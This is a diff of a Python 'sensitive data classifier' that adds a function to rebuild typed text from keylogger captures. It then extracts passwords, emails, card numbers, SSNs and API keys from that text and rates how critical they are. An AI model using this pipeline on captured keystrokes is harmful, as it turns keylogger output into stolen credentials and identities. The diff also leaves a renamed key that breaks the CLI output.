@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 """
 classifier.py - Enhanced email/password classifier with LLM support
-
 Combines regex patterns with AI to detect sensitive data and assess criticality.
 Uses observer pattern to notify when critical data is found.
 """
@@ -18,8 +17,7 @@ from datetime import datetime
 EMAIL_RE = re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")
 CREDIT_CARD_RE = re.compile(r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b')
 SSN_RE = re.compile(r'\b\d{3}-\d{2}-\d{4}\b')
-API_KEY_RE = re.compile(r'(?i)(api[_-]?key|token|secret)["\s:=]+([a-zA-Z0-9_\-]{20,})')
-
+API_KEY_RE = re.compile(r'(?i)(api[_-]?key|token|secret|auth|key|api)\s*[:=]\s*["\']?([a-zA-Z0-9_\-!@#$%^&*()+={}\[\]|\\:;"\'<>?,./~`]{12,})["\']?')
 # Password patterns - looks for labeled passwords
 LABELED_PATTERNS = [
     re.compile(r"(?i)(?:password|passwd|pass|pwd|pw)\s*[:=]\s*['\"]?([^'\"\s,;]+)['\"]?"),
@@ -39,7 +37,6 @@ UNLABELED_TOKEN_RE = re.compile(r"""\b(?=\S{8,})(?=.*[A-Za-z])(?=.*[0-9@#$%^&*()
 
 class Observer(ABC):
     """Base class for observers - they get notified about events"""
-
     @abstractmethod
     def update(self, event_type: str, data: Dict[str, Any]):
         """Called when something important happens"""
@@ -48,7 +45,6 @@ class Observer(ABC):
 
 class FileObserver(Observer):
     """Saves alerts directly into the JSON output file"""
-
     def __init__(self, json_filepath: str):
         self.json_filepath = json_filepath
         self.alert_data = None
@@ -68,7 +64,6 @@ class FileObserver(Observer):
 
 class Subject:
     """The thing being observed - manages and notifies observers"""
-
     def __init__(self):
         self._observers: List[Observer] = []
 
@@ -97,116 +92,265 @@ def looks_like_url_or_email(token):
         return True
     if token.startswith('http') or '://' in token:
         return True
+    if re.match(r'^[a-z0-9-]+\.(com|org|net|edu|gov|co|io|ai|dev)$', token.lower()):
+        return True
+    if 'youtube' in token.lower() or 'google' in token.lower() or 'facebook' in token.lower():
+        return True
     return False
 
 
 def is_noise_token(token):
-    """Check if a token is just noise (dates, times, key labels)"""
+    """Check if a token is just noise"""
     token = token.strip()
-    # Dates like 2025-01-28
     if re.fullmatch(r"\d{4}-\d{2}-\d{2}", token):
         return True
-    # Times like 10:30:45
     if re.fullmatch(r"\d{1,2}:\d{2}:\d{2}", token):
         return True
-    # Keylogger artifacts like "Key.space"
-    if token.startswith('Key.') or token.startswith('Special:'):
+    if token.startswith('Key.') or token.startswith('Special:') or token.lower().startswith('key:'):
         return True
-    # Short numbers probably aren't passwords
-    if token.isdigit() and len(token) <= 6:
+    if token.startswith('[') and token.endswith(']'):
+        return True
+    keylog_noise = ['backspace', 'shift', 'ctrl', 'alt', 'enter', 'tab', 'esc', 'space']
+    if token.lower() in keylog_noise:
+        return True
+    if len(token) <= 2:
         return True
     return False
 
 
+def reconstruct_text_from_keylog(raw_log: str) -> str:
+    lines = [line.strip() for line in raw_log.splitlines() if line.strip()]
+    buffer = []
+    i = 0
+    caps_lock = False  # Track caps lock state
+
+    while i < len(lines):
+        line = lines[i]
+
+        # Window change → add space as natural break
+        if line.startswith('--- Window:'):
+            if buffer and buffer[-1] not in (' ', '\n'):
+                buffer.append(' ')
+            i += 1
+            continue
+
+        # Backspace
+        if '[backspace]' in line.lower():
+            if buffer:
+                buffer.pop()
+            i += 1
+            continue
+
+        # Caps Lock toggle
+        if 'caps_lock' in line.lower():
+            caps_lock = not caps_lock
+            i += 1
+            continue
+
+        # Shift (check current or previous line)
+        is_shift = '[shift]' in line.lower()
+        if is_shift:
+            i += 1
+            continue
+
+        if i > 0 and '[shift]' in lines[i-1].lower():
+            is_shift = True
+
+        # Skip other modifiers
+        if re.search(r'\[(ctrl|alt|cmd|num_lock|scroll_lock|f\d{1,2})\]', line, re.I):
+            i += 1
+            continue
+
+        # Extract character
+        captured = None
+        m = re.search(r'Key:\s+(.)$', line)
+        if m:
+            captured = m.group(1)
+
+        if captured:
+            # Apply shift or caps lock
+            apply_upper = is_shift or (caps_lock and captured.isalpha())
+
+            if apply_upper:
+                if captured.isalpha():
+                    captured = captured.upper()
+                else:
+                    # Shift symbols
+                    shift_map = {
+                        '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
+                        '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
+                        '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|',
+                        ';': ':', "'": '"', ',': '<', '.': '>', '/': '?', '`': '~'
+                    }
+                    captured = shift_map.get(captured, captured.upper())
+
+            buffer.append(captured)
+            i += 1
+            continue
+
+        # Special keys
+        if 'space' in line.lower():
+            buffer.append(' ')
+        elif 'enter' in line.lower():
+            buffer.append('\n')
+
+        i += 1
+
+    # Final cleanup
+    text = ''.join(buffer).strip()
+    text = re.sub(r'\s{2,}', ' ', text)          # collapse extra spaces
+    text = re.sub(r'([a-zA-Z0-9])\s+([@#$%^&*()_+\-={}\[\]|\\:;"\'<>?,./!~`])', r'\1\2', text)  # remove spaces before symbols
+    text = re.sub(r'([@#$%^&*()_+\-={}\[\]|\\:;"\'<>?,./!~`])\s+([a-zA-Z0-9])', r'\1\2', text)  # after symbols
+
+    # Debug
+    print("\n" + "=" * 70)
+    print("RECONSTRUCTED TEXT (first 400 chars):")
+    print(text[:400])
+    print("Length:", len(text))
+    print("Contains 'password:' ?", 'password:' in text.lower())
+    print("Contains 'PASSWORD:' ?", 'PASSWORD:' in text)
+    print("Contains '#'", '#' in text)
+    print("Contains '$'", '$' in text)
+    print("=" * 70 + "\n")
+
+    return text
+
+
 def extract_emails(text):
-    """Find all email addresses in text"""
-    return EMAIL_RE.findall(text)
+    emails = []
+    emails.extend(EMAIL_RE.findall(text))
+    reconstructed = reconstruct_text_from_keylog(text)
+    if reconstructed:
+        emails.extend(EMAIL_RE.findall(reconstructed))
+
+    # Fix typo domains
+    typo_pattern = re.compile(r'([a-zA-Z0-9._%+-]+)@([a-zA-Z0-9-]+?)(com|org|net|edu|gov|io|co|ai)\b')
+    for match in typo_pattern.finditer(reconstructed):
+        username = match.group(1)
+        domain_part = match.group(2)
+        tld = match.group(3)
+        if domain_part.lower() in ['gail', 'gmai', 'gmal']:
+            domain_part = 'gmail'
+        email = f"{username}@{domain_part}.{tld}"
+        emails.append(email)
+
+    cleaned = []
+    for email in set(emails):
+        if len(email) > 50 or email.count('@') > 1:
+            continue
+        email = re.sub(r'(\.com|\.org|\.net|\.edu|\.gov|\.io).*', r'\1', email)
+        if EMAIL_RE.match(email):
+            cleaned.append(email)
+
+    return list(set(cleaned))
 
 
 def extract_password_candidates(text):
-    """Find potential passwords using multiple strategies"""
+    reconstructed = reconstruct_text_from_keylog(text)
     candidates = []
 
-    # Strategy 1: Look for labeled passwords (password=xyz)
+    # Labeled patterns (keep as-is — they're good)
     for pat in LABELED_PATTERNS:
-        for m in pat.findall(text):
-            if m:
-                token = m.strip()
-                if not looks_like_url_or_email(token) and not is_noise_token(token):
-                    candidates.append(token)
-
-    # Strategy 2: Look for quoted strings (might be passwords)
-    for m in QUOTED_STR_RE.findall(text):
-        t = m.strip()
-        if len(t) >= 6 and not looks_like_url_or_email(t) and not is_noise_token(t):
-            candidates.append(t)
-
-    # Strategy 3: Look for strong password-like tokens
-    for m in UNLABELED_TOKEN_RE.findall(text):
-        token = m.strip().strip('.,;:')
-        if len(token) >= 8 and not looks_like_url_or_email(token) and not is_noise_token(token):
-            if any(ch.isalnum() for ch in token):
+        for m in pat.findall(reconstructed):
+            token = m.strip()
+            if not looks_like_url_or_email(token) and not is_noise_token(token):
                 candidates.append(token)
 
-    return candidates
+    # Quoted strings (keep, but add min length + strength check)
+    for m in QUOTED_STR_RE.findall(reconstructed):
+        t = m.strip()
+        if len(t) >= 8 and not looks_like_url_or_email(t) and not is_noise_token(t):
+            # Add basic strength: at least 1 digit + 1 symbol or uppercase
+            has_digit = any(c.isdigit() for c in t)
+            has_upper = any(c.isupper() for c in t)
+            has_symbol = any(c in '@#$%^&*()_+-=[]{}|;:,.<>?/!~`' for c in t)
+            if has_digit and (has_upper or has_symbol):
+                candidates.append(t)
+
+    # Unlabeled strong tokens — make stricter
+    for m in UNLABELED_TOKEN_RE.findall(reconstructed):
+        token = m.strip()
+        if len(token) >= 8 and not looks_like_url_or_email(token) and not is_noise_token(token):
+            # Reject if it looks like a URL/domain or sentence fragment
+            if '.' in token and len(token.split('.')) > 2:  # e.g. pinterest.fruthb.dz
+                continue
+            if len(token) > 30 and ' ' not in token:  # too long random string = noise
+                continue
+            # Require stronger mix
+            has_digit = any(c.isdigit() for c in token)
+            has_upper = any(c.isupper() for c in token)
+            has_symbol = any(c in '@#$%^&*()_+-=[]{}|;:,.<>?/!~`' for c in token)
+            if has_digit and (has_upper or has_symbol):
+                candidates.append(token)
+
+    return list(set(candidates))
 
 
-def extract_sensitive_data(text):
-    """Find credit cards, SSNs, and API keys"""
+def extract_sensitive_data(text: str) -> dict:
+    """
+    Extract credit cards, SSNs, and API keys/tokens/secrets from raw + reconstructed text.
+    Improved to catch prefixed/variant SSNs and quoted API keys.
+    """
+    reconstructed = reconstruct_text_from_keylog(text)
+
+    # Credit cards - keep original (solid pattern)
+    credit_cards = list(set(
+        CREDIT_CARD_RE.findall(text) +
+        CREDIT_CARD_RE.findall(reconstructed)
+    ))
+
+    # SSNs - improved to handle prefixes like "myssn", "ssn", "my ssn" etc.
+    # Also allows flexible separators (space/dash) and cleans to standard format
+    ssn_candidates = []
+    ssn_pattern = re.compile(r'(?i)(?:ssn|social|my\s*ssn|ssn\s*number)?\s*[:=]?\s*(\d{3}[- ]?\d{2}[- ]?\d{4})')
+    for m in ssn_pattern.finditer(reconstructed + text):
+        digits = re.sub(r'[^0-9]', '', m.group(1))  # remove dashes/spaces
+        if len(digits) == 9 and digits.isdigit():
+            formatted = f"{digits[:3]}-{digits[3:5]}-{digits[5:]}"
+            ssn_candidates.append(formatted)
+
+    # API keys/tokens/secrets - improved to catch after =/:, strip quotes, allow shorter but strong keys
+    api_pattern = re.compile(r'(?i)(api[_-]?key|token|secret|auth|key|api)\s*[:=]\s*["\']?([a-zA-Z0-9_\-!@#$%^&*()+={}\[\]|\\:;"\'<>?,./~`]{12,})["\']?')
+    api_candidates = []
+    for m in api_pattern.finditer(reconstructed + text):
+        key_value = m.group(2).strip('"\'')  # remove surrounding quotes
+        if len(key_value) >= 12 and not looks_like_url_or_email(key_value):
+            api_candidates.append(key_value)
+
     return {
-        'credit_cards': CREDIT_CARD_RE.findall(text),
-        'ssns': SSN_RE.findall(text),
-        'api_keys': [match[1] for match in API_KEY_RE.findall(text)]
+        'credit_cards': credit_cards,
+        'ssns': list(set(ssn_candidates)),          # dedup and use improved list
+        'api_keys': list(set(api_candidates))       # dedup and cleaned
     }
 
 
 # ============================================================================
-# LLM ANALYZER - Uses AI to assess how dangerous the data is
+# LLM ANALYZER - Uses Hugging Face model for criticality
 # ============================================================================
 
 class CriticalityAnalyzer:
     """Uses Hugging Face model to determine if found data is critical"""
-
     def __init__(self, use_local_model=True):
         self.use_local_model = use_local_model
         self.model = None
-
         if use_local_model:
             self._init_local_model()
 
     def _init_local_model(self):
-        """Load the pre-trained sentiment analysis model"""
         try:
             from transformers import pipeline
-
-            #print("[*] Loading AI model (first time takes ~1 minute)...")
-
-            # Load a lightweight model that detects positive/negative sentiment
-            # We use this to detect if text "sounds" dangerous or not
             self.model = pipeline(
                 "sentiment-analysis",
                 model="distilbert-base-uncased-finetuned-sst-2-english",
-                device=-1  # Use CPU
+                device=-1
             )
-
-            #print("[+] Model ready!")
-
         except ImportError:
-            #print("[!] AI model not available (install: pip install transformers torch)")
             self.model = None
-        except Exception as e:
-            #print(f"[!] Could not load model: {e}")
+        except Exception:
             self.model = None
 
     def analyze_criticality(self, text_sample: str, context: Dict[str, Any]) -> Dict[str, Any]:
-        """
-        Analyze how critical/dangerous the found data is
-        Combines rule-based counting with AI understanding
-        """
-        # Method 1: Count specific items (reliable but dumb)
         rule_score = self._rule_based_score(context)
-
-        # Method 2: Use AI to understand context (smart but can make mistakes)
         llm_score = 0.0
         llm_reasoning = "AI not available"
 
@@ -215,117 +359,76 @@ class CriticalityAnalyzer:
             llm_score = llm_result['score']
             llm_reasoning = llm_result['reasoning']
 
-        # Combine both scores (trust counting more than AI)
         final_score = (rule_score * 0.6) + (llm_score * 0.4)
-
-        # Convert number to words (0.85 -> "CRITICAL")
         criticality_level = self._get_criticality_level(final_score)
 
         return {
             'criticality_level': criticality_level,
-            'confidence_score': final_score,
-            'rule_based_score': rule_score,
-            'llm_score': llm_score,
-            'llm_reasoning': llm_reasoning,
+            'final_risk_score': final_score,  # was confidence_score
+            'rules_danger': rule_score,
+            'ai_suspicion': llm_score,
+            'ai_reasoning': llm_reasoning,
             'is_critical': final_score >= 0.7
         }
 
     def _rule_based_score(self, context: Dict[str, Any]) -> float:
-        """Calculate danger score by counting what we found"""
         score = 0.0
-
-        # Each email adds a little danger
-        email_count = context.get('email_count', 0)
-        if email_count > 0:
-            score += min(0.2, email_count * 0.05)
-
-        # Passwords are more serious
-        pw_count = context.get('password_count', 0)
-        if pw_count > 0:
-            score += min(0.4, pw_count * 0.1)
-
-        # Financial data is very serious
+        if context.get('email_count', 0) > 0:
+            score += min(0.2, context['email_count'] * 0.05)
+        if context.get('password_count', 0) > 0:
+            score += min(0.4, context['password_count'] * 0.1)
         if context.get('has_credit_cards', False):
             score += 0.3
         if context.get('has_ssns', False):
             score += 0.3
         if context.get('has_api_keys', False):
             score += 0.25
-
-        return min(1.0, score)  # Cap at 1.0
+        return min(1.0, score)
 
     def _llm_based_score(self, text_sample: str) -> Dict[str, Any]:
-        """Ask the AI model if the text sounds dangerous"""
         if not self.model:
             return {'score': 0.0, 'reasoning': 'Model not available'}
-
         try:
-            # Only analyze first 500 chars (model can't handle huge text)
             if len(text_sample) > 500:
                 text_sample = text_sample[:500] + "..."
-
-            # Ask the model
             prompt = f"This text contains sensitive information: {text_sample}"
             result = self.model(prompt)[0]
-
-            # Convert sentiment to danger score
             if result['label'] == 'NEGATIVE':
-                # Negative sentiment means concerning content
                 score = result['score']
                 reasoning = f"AI detected concerning content ({score:.2f} confidence)"
             else:
-                # Positive sentiment means normal content (flip the score)
                 score = 1.0 - result['score']
-                reasoning = f"AI detected normal content"
-
+                reasoning = "AI detected normal content"
             return {'score': score, 'reasoning': reasoning}
-
         except Exception as e:
             return {'score': 0.0, 'reasoning': f'AI error: {str(e)}'}
 
     def _get_criticality_level(self, score: float) -> str:
-        """Convert numeric score to text level"""
-        if score >= 0.8:
-            return "CRITICAL"
-        elif score >= 0.6:
-            return "HIGH"
-        elif score >= 0.4:
-            return "MEDIUM"
-        elif score >= 0.2:
-            return "LOW"
-        else:
-            return "MINIMAL"
+        if score >= 0.8: return "CRITICAL"
+        elif score >= 0.6: return "HIGH"
+        elif score >= 0.4: return "MEDIUM"
+        elif score >= 0.2: return "LOW"
+        else: return "MINIMAL"
 
 
 # ============================================================================
-# MAIN CLASSIFIER - Puts everything together
+# MAIN CLASSIFIER
 # ============================================================================
 
 class EnhancedClassifier(Subject):
-    """
-    Main classifier that:
-    1. Finds sensitive data using regex
-    2. Assesses criticality using AI
-    3. Notifies observers when critical data is found
-    """
-
+    """Main classifier that finds sensitive data and assesses criticality"""
     def __init__(self, use_llm=True):
         super().__init__()
         self.analyzer = CriticalityAnalyzer(use_local_model=use_llm) if use_llm else None
 
     def classify_text(self, text: str) -> Dict[str, Any]:
-        """Main function - analyze text and return results"""
-
-        # Step 1: Extract all the data using regex
         emails = extract_emails(text)
         passwords = extract_password_candidates(text)
         sensitive = extract_sensitive_data(text)
 
-        # Count unique items
         email_counts = Counter(emails)
         pw_counts = Counter(passwords)
 
-        # Step 2: Build context for AI analyzer
         context = {
             'email_count': len(email_counts),
             'password_count': len(pw_counts),
@@ -334,59 +437,30 @@ class EnhancedClassifier(Subject):
             'has_api_keys': len(sensitive['api_keys']) > 0
         }
 
-        # Step 3: Assess criticality (if AI is available)
         criticality = None
         if self.analyzer:
             text_sample = text[:1000] if len(text) > 1000 else text
             criticality = self.analyzer.analyze_criticality(text_sample, context)
 
-        # Step 4: Notify observers if critical
         if criticality and criticality['is_critical']:
             self.notify("CRITICAL_DATA_FOUND", {
                 "criticality_level": criticality['criticality_level'],
-                "confidence": criticality['confidence_score'],
+                "confidence": criticality['final_risk_score'],  # ← changed to the new key name
                 "email_count": len(email_counts),
                 "password_count": len(pw_counts),
                 "sensitive_data": sensitive
             })
 
-        # Step 5: Return complete results
         return {
             'emails': [{'value': v, 'count': c} for v, c in email_counts.most_common()],
             'passwords': [{'value': v, 'count': c} for v, c in pw_counts.most_common()],
-            'sensitive_data': {
-                'credit_cards': list(set(sensitive['credit_cards'])),
-                'ssns': list(set(sensitive['ssns'])),
-                'api_keys': list(set(sensitive['api_keys']))
-            },
+            'sensitive_data': sensitive,
             'criticality_assessment': criticality
         }
 
-# ============================================================================
-# SIMPLE FUNCTION FOR BACKWARDS COMPATIBILITY
-# ============================================================================
-
-def classify_text(text):
-    """
-    Simple function that works like the old classifier
-    For backwards compatibility with existing code
-    """
-    classifier = EnhancedClassifier(use_llm=False)  # Fast mode without AI
-
-    emails = extract_emails(text)
-    pw_candidates = extract_password_candidates(text)
-
-    email_counts = Counter(emails)
-    pw_counts = Counter(pw_candidates)
-
-    return {
-        'emails': [{'value': v, 'count': c} for v, c in email_counts.most_common()],
-        'passwords': [{'value': v, 'count': c} for v, c in pw_counts.most_common()],
-    }
-
 
 # ============================================================================
-# CLI INTERFACE (if run directly)
+# CLI INTERFACE (for standalone testing)
 # ============================================================================
 
 def main():
@@ -399,31 +473,37 @@ def main():
     parser.add_argument('--no-llm', action='store_true', help='Disable AI (faster)')
     args = parser.parse_args()
 
-    # Read input file
     if not os.path.isfile(args.input):
+        print(f"Error: File not found: {args.input}")
         sys.exit(1)
 
     with open(args.input, 'r', encoding='utf-8', errors='ignore') as f:
         text = f.read()
 
-    # Determine output path
     out_path = args.out or (args.input + '.classified.json')
 
-    # Create classifier and attach FileObserver
     classifier = EnhancedClassifier(use_llm=not args.no_llm)
     file_observer = FileObserver(out_path)
     classifier.attach(file_observer)
 
-    # Analyze
+    print(f"[*] Analyzing {args.input}...")
     result = classifier.classify_text(text)
 
-    # Add observer alert data to result if exists
     if file_observer.get_alert_data():
         result['alert'] = file_observer.get_alert_data()
 
-    # Save results to JSON
     with open(out_path, 'w', encoding='utf-8') as f:
         json.dump(result, f, indent=2, ensure_ascii=False)
+
+    print(f"[+] Results saved to: {out_path}")
+    print(f"\nFound:")
+    print(f" - {len(result['emails'])} emails")
+    print(f" - {len(result['passwords'])} passwords")
+    print(f" - {len(result['sensitive_data']['credit_cards'])} credit cards")
+
+    if result['criticality_assessment']:
+        crit = result['criticality_assessment']
+        print(f"\nCriticality: {crit['criticality_level']} ({crit['confidence_score']:.0%})")
 
 
 if __name__ == '__main__':
